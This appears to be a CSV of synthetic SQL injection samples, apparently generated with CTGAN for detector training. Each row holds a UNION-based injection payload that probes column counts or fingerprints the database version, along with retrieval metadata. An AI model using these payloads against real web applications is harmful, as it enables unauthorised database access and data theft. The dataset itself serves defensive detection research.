id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000405,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R000695,5.645640061163751
CTGAN_000406,attack,union,"1'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001581,4.371538084294042
CTGAN_000407,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,4.917823934232213
CTGAN_000408,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000974,6.453153950769364
CTGAN_000409,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R001279,5.5635811267137765
CTGAN_000410,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000858,5.973332496450625
CTGAN_000411,attack,union,"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",nearest_attack_euclidean,R000321,5.486448405522186
CTGAN_000412,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R000447,4.201880736070018
CTGAN_000413,attack,union,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",nearest_attack_euclidean,R000701,6.056909697717215
CTGAN_000414,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000751,3.531041085991277
CTGAN_000415,attack,union,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",nearest_attack_euclidean,R001595,6.849580319165336
CTGAN_000416,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R001261,5.930867442092332
CTGAN_000417,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,6.692431033392267
CTGAN_000418,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,6.0819485998540666
CTGAN_000419,attack,union,"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",nearest_attack_euclidean,R001413,6.378148908971804
CTGAN_000420,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R001451,3.610109027441274
CTGAN_000421,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R001367,6.742483016465116
CTGAN_000422,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001436,7.546605202306861
CTGAN_000423,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R001178,6.751863444144703
CTGAN_000424,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001647,5.412564485346767
CTGAN_000425,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000596,7.265811801776348
CTGAN_000426,attack,union,"-1868   )    )    union all select 1859,1859--",nearest_attack_euclidean,R000795,4.332551298865922
CTGAN_000427,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R001157,5.203250183931334
CTGAN_000428,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000345,6.390047868984842
CTGAN_000429,attack,union,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",nearest_attack_euclidean,R000678,3.5782437307685315
CTGAN_000430,attack,union,"1  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001199,5.756453745123172
CTGAN_000431,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,6.305808655634584
CTGAN_000432,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000119,7.035365759091682
CTGAN_000433,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,9.252900562882761
CTGAN_000434,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R000613,5.252291801893879
CTGAN_000435,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,5.31761236769973
CTGAN_000436,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000525,5.328557737972063
CTGAN_000437,attack,union,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",nearest_attack_euclidean,R000570,5.405936427895054
CTGAN_000438,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000473,5.685374515401562
CTGAN_000439,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000755,3.512402951607723
CTGAN_000440,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,5.015528138513857
CTGAN_000441,attack,union,-7037'   )    )    as epsg where 3684  =  3684 union all select 3684--,nearest_attack_euclidean,R001372,5.8497904974099955
CTGAN_000442,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000603,7.094976757698494
CTGAN_000443,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000245,4.122767138953314
CTGAN_000444,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000956,2.6066026069718995
CTGAN_000445,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000792,6.564437081925722
CTGAN_000446,attack,union,-3988'   )    )    union all select 1113#,nearest_attack_euclidean,R001131,5.071869112128152
CTGAN_000447,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000507,5.249430787174575
CTGAN_000448,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000785,3.8726673742220608
CTGAN_000449,attack,union,"1   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000770,4.171125890430128
CTGAN_000450,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000532,5.402009607024887
CTGAN_000451,attack,union,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",nearest_attack_euclidean,R000225,5.335439688743841
CTGAN_000452,attack,union,"1' where 4245  =  4245 union all select null,null--",nearest_attack_euclidean,R001500,6.945955204316311
CTGAN_000453,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.71567211267146
CTGAN_000454,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,7.51657489790146
CTGAN_000455,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001670,5.431699369159881
CTGAN_000456,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R000584,4.629263937176645
CTGAN_000457,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001123,3.954248113394695
CTGAN_000458,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,7.996006912342753
CTGAN_000459,attack,union,"-9337  )   union all select 5648,5648,5648,5648,5648#",nearest_attack_euclidean,R000479,5.464681828808676
CTGAN_000460,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.518938313761862
CTGAN_000461,attack,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",nearest_attack_euclidean,R000934,5.343963665856862
CTGAN_000462,attack,union,"-2263'  )   where 7931  =  7931 union all select 7931,7931,7931--",nearest_attack_euclidean,R001470,5.441593005894181
CTGAN_000463,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,6.340014717734611
CTGAN_000464,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R001179,6.6640411216784505
CTGAN_000465,attack,union,"1'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000460,5.898706961651872
CTGAN_000466,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,5.874236510668494
CTGAN_000467,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000496,5.8297332679540474
CTGAN_000468,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000902,5.288478818724597
CTGAN_000469,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001477,5.541073912952167
CTGAN_000470,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R001592,7.537445793140597
CTGAN_000471,attack,union,"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001532,4.849628786841323
CTGAN_000472,attack,union,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",nearest_attack_euclidean,R001584,5.173290102378338
CTGAN_000473,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R001029,5.466120354568688
CTGAN_000474,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,5.713533491270162
CTGAN_000475,attack,union,"-4473'  )   union all select 7656,7656#",nearest_attack_euclidean,R001485,5.707211171108018
CTGAN_000476,attack,union,"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001477,4.978634827663411
CTGAN_000477,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000261,5.2967650038578125
CTGAN_000478,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001224,4.815868743801564
CTGAN_000479,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R001103,6.9846327839565685
CTGAN_000480,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,4.3796614411783645
CTGAN_000481,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000488,6.04166747084719
CTGAN_000482,attack,union,"1""  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000625,4.104669015929262
CTGAN_000483,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001123,6.621914028570553
CTGAN_000484,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,7.474672622278513
CTGAN_000485,attack,union,"1  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001199,4.045606304420659
CTGAN_000486,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000528,7.096128475633856
CTGAN_000487,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000338,6.293896105042813
CTGAN_000488,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001533,4.739794142194313
CTGAN_000489,attack,union,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",nearest_attack_euclidean,R000361,6.666753717593234
CTGAN_000490,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,6.912539048206071
CTGAN_000491,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R001335,5.940442380728208
CTGAN_000492,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,5.309619834014658
CTGAN_000493,attack,union,-7231   )    )    union all select 7639#,nearest_attack_euclidean,R000600,5.744168986747727
CTGAN_000494,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000493,5.943402345623171
CTGAN_000495,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,5.4986148134892385
CTGAN_000496,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,5.000415691137229
CTGAN_000497,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,6.2270250961804114
CTGAN_000498,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R001018,4.634586217533525
CTGAN_000499,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001670,4.850721259002278
CTGAN_000500,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,6.0196084259920735
